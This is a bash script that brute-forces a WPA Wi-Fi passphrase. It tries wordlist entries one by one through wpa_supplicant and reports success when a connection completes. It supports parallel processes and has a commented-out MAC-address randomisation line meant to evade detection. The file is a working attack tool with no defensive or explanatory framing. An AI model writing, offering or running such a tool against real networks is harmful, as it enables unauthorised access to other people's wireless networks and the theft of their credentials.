#!/bin/bash

RED='\x1b[31m'
GREEN='\x1b[32m'
GREY='\x1b[90m'
RESET='\x1b[0m'

[[ $# -ge 1 ]] && essid="$1" || read -p 'essid: ' essid
[[ $# -ge 2 ]] && wordlist="$2" || read -p 'wordlist: ' wordlist
[[ $# -ge 3 ]] && threads="$3" || threads=1
[ -z "$TIMEOUT" ] && TIMEOUT=15
[ -z "$IFACE" ] && IFACE=wlan0
rand=$RANDOM

if [ "$threads" -eq 1 ]; then
    touch "/tmp/wpa_brute/wpa_${rand}_${essid//\//-}.conf"
    while read -r password
    do echo -ne $GREY"$password            \r"$RESET
        [[ "${#password}" -lt 8 ]] && continue
        #sudo ifconfig $IFACE down; sudo ifconfig $IFACE hw ether "00:$[RANDOM%110+10]:$[RANDOM%110+10]:$[RANDOM%110+10]:$[RANDOM%110+10]:$[RANDOM%110+10]" 2> /dev/null; sudo ifconfig $IFACE up
        wpa_passphrase "$essid" "$password" > "/tmp/wpa_brute/wpa_${rand}_${essid//\//-}.conf" || continue
        sed -i 's/^.*#psk=.*$/\tscan_ssid=1/g' "/tmp/wpa_brute/wpa_${rand}_${essid//\//-}.conf"
        sudo ifconfig $IFACE up
        sudo timeout $TIMEOUT wpa_supplicant -i $IFACE -c "/tmp/wpa_brute/wpa_${rand}_${essid//\//-}.conf" 2>&1 > "/tmp/wpa_brute/wpa_${rand}_${essid//\//-}.log" &
        wpa_supplicant=$!
        tail -f "/tmp/wpa_brute/wpa_${rand}_${essid//\//-}.log" 2> /dev/null | while read -t $TIMEOUT line
        do
    	#echo "$line"
            if echo "$line" | grep -q "completed"; then
                break
            elif echo "$line" | grep -q "Handshake failed"; then
                break
            fi
        done
        sudo pkill -P $wpa_supplicant 2> /dev/null
        now=$(date +'%H:%M:%S')
        if grep -q "complete" "/tmp/wpa_brute/wpa_${rand}_${essid//\//-}.log" > /dev/null; then
            echo -e $GREEN "[+] [$now] $IFACE $essid: $password" $RESET
            ret=0
            break
          elif grep -q "Handshake failed" "/tmp/wpa_brute/wpa_${rand}_${essid//\//-}.log"; then
            echo -e $RED "[-] [$now] $IFACE $essid: $password" $RESET
            ret=1
          else
            echo -e $GREY "[!] [$now] $IFACE $essid: $password" $RESET
            echo "$password" >> "$wordlist"
            ret=2
        fi
        rm "/tmp/wpa_brute/wpa_${rand}_${essid//\//-}.log" 2> /dev/null
        rm "/tmp/wpa_brute/wpa_${rand}_${essid//\//-}.conf" 2> /dev/null
    done < "$wordlist"
    exit $ret
elif [ "$threads" -gt 1 ]; then
    typeset -a pids=()
    for ((thread=0; thread<$threads; thread++)); do
        "$0" "$1" <(cat "$2" | awk "NR%$threads==$thread") && pkill -f "$0" &
        pids+=($!)
        #sleep 0.25
    done
    for pid in ${pids[*]}; do
        tail --pid=$pid -f /dev/null
        wait $pid
        ret=$?
        if [ $ret -lt 2 ]; then exit $ret; fi
    done
    exit 2
fi
